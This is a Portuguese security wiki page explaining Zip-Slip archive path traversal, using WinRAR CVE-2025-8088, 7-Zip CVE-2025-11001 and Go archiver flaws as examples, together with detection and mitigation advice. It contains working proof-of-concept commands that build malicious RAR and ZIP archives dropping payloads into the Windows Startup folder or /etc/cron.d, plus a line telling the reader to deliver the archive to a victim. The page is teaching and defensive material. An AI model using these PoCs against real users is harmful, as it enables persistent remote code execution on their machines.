# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Visão geral

Muitos formatos de archive (ZIP, RAR, TAR, 7-ZIP, etc.) permitem que cada entrada contenha seu próprio **internal path**. Quando um utilitário de extração respeita esse caminho cegamente, um nome de arquivo criado contendo `..` ou um **absolute path** (por exemplo, `C:\Windows\System32\`) será gravado fora do diretório escolhido pelo usuário.
Essa classe de vulnerabilidade é amplamente conhecida como *Zip-Slip* ou **archive extraction path traversal**.

As consequências variam desde a sobrescrita de arquivos arbitrários até a obtenção direta de **remote code execution (RCE)** ao inserir um payload em um local de **auto-run**, como a pasta *Startup* do Windows.

## Causa raiz

1. O atacante cria um archive no qual um ou mais cabeçalhos de arquivo contêm:
* Sequências de traversal relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ou **symlinks** criados para resolver fora do diretório de destino (comum em ZIP/TAR no *nix).
2. A vítima extrai o archive com uma ferramenta vulnerável que confia no caminho incorporado (ou segue symlinks), em vez de sanitizá-lo ou forçar a extração para dentro do diretório escolhido.
3. O arquivo é gravado no local controlado pelo atacante e executado/carregado na próxima vez que o sistema ou o usuário acionar esse caminho.

### .NET `Path.Combine` + `ZipArchive` traversal

Um anti-pattern comum em .NET consiste em combinar o destino pretendido com o `ZipArchiveEntry.FullName` **user-controlled** e extrair sem normalização de caminho:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Se `entry.FullName` começa com `..\\`, ocorre traversal; se for um **absolute path**, o componente à esquerda é totalmente descartado, resultando em uma **arbitrary file write** como identidade da extração.
- Archive de proof-of-concept para escrever em um diretório `app` irmão monitorado por um scanner agendado:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Ao inserir esse ZIP na caixa de entrada monitorada, o resultado é `C:\samples\app\0xdf.txt`, comprovando o traversal para fora de `C:\samples\queue\` e possibilitando primitives subsequentes (por exemplo, DLL hijacks).

## Exemplo do mundo real – WinRAR ≤ 7.12 (CVE-2025-8088)

O WinRAR para Windows (incluindo a CLI `rar` / `unrar`, a DLL e o código-fonte portátil) não validava os nomes dos arquivos durante a extração.
Um arquivo RAR malicioso contendo uma entrada como:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
acabaria **fora** do diretório de saída selecionado e dentro da pasta *Startup* do usuário. Após o logon, o Windows executa automaticamente tudo o que estiver presente nela, fornecendo RCE *persistente*.<sup>[[5]](#references)</sup>

### Criando um arquivo PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opções usadas:
* `-ep`  – armazena os caminhos dos arquivos exatamente como fornecidos (não remove o `./` inicial).

Entregue `evil.rar` à vítima e instrua-a a extraí-lo com uma versão vulnerável do WinRAR.

### Exploração observada na prática

A ESET relatou campanhas de spear-phishing do RomCom (Storm-0978/UNC2596) que anexavam arquivos RAR abusando do CVE-2025-8088 para implantar backdoors personalizados e facilitar operações de ransomware.<sup>[[5]](#references)</sup>

## Casos mais recentes (2024–2025)

### Traversal de symlink em ZIP do 7-Zip → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: entradas ZIP que eram **symbolic links** eram desreferenciadas durante a extração, permitindo que atacantes escapassem do diretório de destino e sobrescrevessem caminhos arbitrários. A interação do usuário consiste apenas em *abrir/extrair* o arquivo.<sup>[[1]](#references)</sup>
* **Afetado**: 7-Zip 21.02–24.09 (builds para Windows e Linux). Corrigido na versão **25.00** (julho de 2025) e posteriores.
* **Caminho de impacto**: Sobrescrever `Start Menu/Programs/Startup` ou locais executados por serviços → o código é executado no próximo logon ou reinício do serviço.
* **PoC rápido (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Em uma build corrigida, `/etc/cron.d` não será afetado; o symlink será extraído como um link dentro de `/tmp/target`.

### Zip-Slip em `Unarchive()` do Go mholt/archiver (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` segue `../` e entradas ZIP com symlink, gravando fora de `outputDir`.<sup>[[2]](#references)</sup>
* **Afetado**: `github.com/mholt/archiver` ≤ 3.5.1 (o projeto está atualmente deprecated).
* **Correção**: Mude para `mholt/archives` ≥ 0.1.0 ou implemente verificações de caminhos canônicos antes da gravação.
* **Reprodução mínima**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Dicas de detecção

* **Inspeção estática** – Liste as entradas do arquivo e sinalize qualquer nome contendo `../`, `..\\`, *caminhos absolutos* (`/`, `C:`) ou entradas do tipo *symlink* cujo destino esteja fora do diretório de extração.
* **Canonicalização** – Garanta que `realpath(join(dest, name))` ainda comece com `dest`. Rejeite caso contrário.<sup>[[3]](#references)</sup>
* **Extração em sandbox** – Descompacte em um diretório descartável usando um extractor *seguro* (por exemplo, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) e verifique se os caminhos resultantes permanecem dentro do diretório.
* **Monitoramento de endpoints** – Gere um alerta sobre novos executáveis gravados em locais `Startup`/`Run`/`cron` pouco depois de um arquivo ser aberto pelo WinRAR/7-Zip/etc.

## Mitigação e hardening

1. **Atualize o extractor** – WinRAR 7.13+ e 7-Zip 25.00+ implementam sanitização de caminhos/symlinks. Ambas as ferramentas ainda não têm atualização automática.
2. Extraia arquivos com “**Do not extract paths**” / “**Ignore paths**” quando possível.
3. No Unix, reduza os privilégios e monte um **chroot/namespace** antes da extração; no Windows, use **AppContainer** ou um sandbox.
4. Se estiver escrevendo código personalizado, normalize com `realpath()`/`PathCanonicalize()` **antes** de criar/gravar e rejeite qualquer entrada que escape do destino.

## Casos adicionais afetados / históricos

* 2018 – Advisory massivo de *Zip-Slip* da Snyk afetando muitas bibliotecas Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011, com traversal semelhante durante a mesclagem `-ao`.
* 2025 – `go-slug` da HashiCorp (CVE-2025-0377), com traversal durante a extração de TAR em slugs (patch na v1.2).
* Qualquer lógica de extração personalizada que não chame `PathCanonicalize` / `realpath` antes da gravação.

## Referências

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
